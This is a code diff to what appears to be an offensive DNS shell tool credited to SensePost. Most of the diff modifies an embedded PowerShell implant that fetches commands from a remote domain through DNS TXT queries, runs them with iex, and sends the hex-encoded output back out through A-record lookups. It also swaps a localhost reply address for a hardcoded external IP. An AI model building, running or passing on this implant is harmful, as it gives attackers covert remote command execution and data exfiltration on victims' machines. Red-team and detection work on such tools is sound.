@@ -31,15 +31,21 @@ def powershell_encode(data):
 def prepare_recursive(domain):
    st2 = """
 $url = "%s";
-function execDNS($cmd) {
+function execDNS($cmd) 
+{
+Write-Host $cmd 
 $c = iex $cmd 2>&1 | Out-String;
+if ([string]::IsNullOrEmpty($c))
+{continue}
+else
+{
 $u = [system.Text.Encoding]::UTF8.GetBytes($c);
 $string = [System.BitConverter]::ToString($u);
 $string = $string -replace '-','';
 $len = $string.Length;
 $split = 50;
 $repeat=[Math]::Floor($len/$split);
-$remainder=$len%%$split;
+$remainder=$len%$split;
 if($remainder){ $repeatr = $repeat+1};
 $rnd = Get-Random;$ur = $rnd.toString()+".CMDC"+$repeatr.ToString()+"."+$url;
 $q = nslookup -querytype=A $ur;
@@ -55,17 +61,20 @@ if($remainder){
     $q = nslookup -querytype=A $ur2;
 };
 $rnd=Get-Random;$s=$rnd.ToString()+".END."+$url;$q = nslookup -querytype=A $s;
+}
 };
 while (1){
    $c = Get-Random;
    Start-Sleep -s 3
-   $u=$c.ToString()+"."+$url;$txt = nslookup -querytype=TXT $u | Out-String
-   $txt = $txt.split("`n") | %%{$_.split('"')[1]} | Out-String
+   $u="__"+$c.ToString()+"."+$url;$txt = nslookup -querytype=TXT $u | Out-String
+   $txt = $txt.split("`n") | %{$_.split('"')[1]} | Out-String
+   Write-Host $txt
    if ($txt -match 'NoCMD'){continue}
+   elseif ([string]::IsNullOrEmpty($txt)){continue}
    elseif ($txt -match 'exit'){Exit}
    else{execDNS($txt)}
-}   
-""" % (domain,)
+}
+""" 
    return powershell_encode(st2)
 
 def prepare_direct(ip):
@@ -114,7 +123,7 @@ def parse_output(req):
     cmd = 'NoCMD'
     request = req
     reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
-    rdata = A('127.0.0.1') 
+    rdata = A('94.23.123.17') 
     TTL = 60 * 5
     rqt = rdata.__class__.__name__
     cmds.append([request.q.qname.label[1],request.q.qname.label[3]])
@@ -177,8 +186,9 @@ class BaseRequestHandler(SocketServer.BaseRequestHandler):
 class UDPRequestHandler(BaseRequestHandler):
 
     def get_data(self):
-	global newConn,recvConn,client_ip
-	if newConn:
+	global newConn,recvConn,client_ip 
+        #print "[+] Request %s " %  self.request[0].strip().split()[1]
+	if newConn and self.request[0].strip().split()[1][:2] == '__':
 	   newConn = 0
 	   recvConn = 1
 	   client_ip = self.client_address
@@ -242,7 +252,8 @@ ________    _______    _________           _________.__           .__  .__
 /_______  /\____|__  /_______  /         /_______  /|___|  /\___  >____/____/
         \/         \/        \/                  \/      \/     \/           
 
-								by research (at) SensePost
+							by research (at) SensePost
+                                                        Updated by firefalc0n@protonmail.com
 '''
 	cmds = []
 	cr = []
